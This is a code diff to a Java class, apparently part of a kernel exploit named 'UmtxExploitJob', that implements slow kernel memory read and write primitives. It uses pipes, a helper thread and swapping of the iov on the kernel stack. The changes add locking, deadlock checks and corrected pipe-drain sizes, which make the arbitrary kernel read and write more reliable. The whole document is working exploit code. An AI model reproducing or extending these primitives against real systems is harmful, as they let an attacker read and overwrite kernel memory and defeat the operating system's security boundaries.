@@ -36,8 +36,10 @@ class KernelAccessorSlow implements KernelAccessor {
             throw new IllegalArgumentException("Length cannot be greater than " + UmtxExploitJob.KPRIM_BUF_SIZE);
         }
 
-        // Take the thread out of reset
-        kPrimThreadData.resetSignal.set(false);
+        // Protection against deadlock
+        if (kPrimThreadData.cmd.get() != UmtxExploitJob.KPRIM_NOP) {
+            throw new IllegalStateException("Reclaim thread not yet reset");
+        }
 
         // Set args
         kPrimThreadData.uaddr.set(uaddr);
@@ -47,13 +49,11 @@ class KernelAccessorSlow implements KernelAccessor {
         // Set command, we do this last because it kickstarts the thread to do stuff
         kPrimThreadData.cmd.set(cmd);
 
-        libKernel.usleep(50000L);
+        // Give some time to the thread to process the command
+        sleep(50L);
         if (DebugStatus.isTraceEnabled()) {
             DebugStatus.trace("[+] kprim send (" + cmd + ", 0x" + Long.toHexString(uaddr) + ", 0x" + Long.toHexString(kaddr) + "), len=" + len + ", read=" + kPrimThreadData.readCounter.get() + ", write=" + kPrimThreadData.writeCounter.get());
         }
-
-        // Command is done, clear the command and put the thread into reset
-        kPrimThreadData.resetSignal.set(true);
     }
 
     private boolean swapIovInKstack(long origIovBase, long newIovBase, int uioSegFlg, int uioRw, int len) {
@@ -81,7 +81,7 @@ class KernelAccessorSlow implements KernelAccessor {
         }
 
         if (stack_iov_offset < 0) {
-            //Status.println("[+] iov not found in stack");
+            DebugStatus.trace("[-] iov not found in stack");
             return false;
         }
 
@@ -91,7 +91,7 @@ class KernelAccessorSlow implements KernelAccessor {
         return true;
     }
 
-    void slowCopyOut(long kaddr, Pointer uaddr, int len) {
+    synchronized void slowCopyOut(long kaddr, Pointer uaddr, int len) {
         // Fill pipe up to max
         long totalGarbageSize = 0;
         for (long i = 0; i < UmtxExploitJob.PIPE_SLOW_SIZE; i += UmtxExploitJob.PIPE_SLOW_BATCH_SIZE) {
@@ -113,9 +113,9 @@ class KernelAccessorSlow implements KernelAccessor {
 
         if (!swapIovInKstack(kPrimThreadData.pipeSlowScratchBuf.addr(), kaddr, 1, 1, len)) {
             SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
-            SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the read pipe following a failed read attempt. Deadlock may occur", rootEx);
+            SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the write pipe following a failed read attempt. Deadlock may occur", rootEx);
             // Unblock the thread
-            if (libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, UmtxExploitJob.PIPE_SLOW_SIZE) != UmtxExploitJob.PIPE_SLOW_SIZE) {
+            if (libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, totalGarbageSize) != totalGarbageSize) {
                 throw causeEx;
             }
             if (libKernel.read(kPrimThreadData.pipeSlowReadFd, uaddr, len) != len) {
@@ -125,9 +125,9 @@ class KernelAccessorSlow implements KernelAccessor {
         }
 
         // Read garbage filler data
-        long readGarbageSize = libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, UmtxExploitJob.PIPE_SLOW_SIZE);
-        if (readGarbageSize != UmtxExploitJob.PIPE_SLOW_SIZE) {
-            throw new SdkRuntimeException("Unable to unlock the pipe. Read: " + readGarbageSize + ". Expected: " + totalGarbageSize);
+        long readGarbageSize = libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, totalGarbageSize);
+        if (readGarbageSize != totalGarbageSize) {
+            throw new SdkRuntimeException("Unable to unlock the write pipe. Read: " + readGarbageSize + ". Expected: " + totalGarbageSize);
         }
         if (DebugStatus.isTraceEnabled()) {
             DebugStatus.trace("Read " + readGarbageSize + " garbage bytes");
@@ -141,22 +141,44 @@ class KernelAccessorSlow implements KernelAccessor {
         if (DebugStatus.isDebugEnabled()) {
             DebugStatus.debug("Read " + read + " bytes");
         }
+
+        // Wait on kprim thread to reset
+        while (kPrimThreadData.cmd.get() != UmtxExploitJob.KPRIM_NOP) {
+            sleep(50L);
+        }
     }
 
-    void slowCopyIn(Pointer uaddr, long kaddr, int len) {
+    synchronized void slowCopyIn(Pointer uaddr, long kaddr, int len) {
         // Signal other thread to read using size we want, the thread will hang until we write
         sendCommand(UmtxExploitJob.KPRIM_WRITE, uaddr.addr(), kaddr, len);
 
         if (!swapIovInKstack(kPrimThreadData.pipeSlowScratchBuf.addr(), kaddr, 1, 0, len)) {
+            SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
+            SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the read pipe following a failed write attempt. Deadlock may occur", rootEx);
             // Unblock the thread
-            libKernel.read(kPrimThreadData.pipeSlowWriteFd, uaddr, len);
-            throw new SdkRuntimeException("Unable to swap iov, pattern not found");
+            if (libKernel.write(kPrimThreadData.pipeSlowWriteFd, uaddr, len) != len) {
+                throw causeEx;
+            }
+            throw rootEx;
         }
 
         // Write data to write to pointer
         long written = libKernel.write(kPrimThreadData.pipeSlowWriteFd, uaddr, len);
         if (written != len) {
             throw new SdkRuntimeException("Unexpected number of bytes written: " + written + " instead of " + len);
+        }
+
+        // Wait on kprim thread to reset
+        while (kPrimThreadData.cmd.get() != UmtxExploitJob.KPRIM_NOP) {
+            sleep(50L);
+        }
+    }
+
+    private void sleep(long millis) {
+        try {
+            Thread.sleep(millis);
+        } catch (InterruptedException e) {
+            // Ignore
         }
     }
 
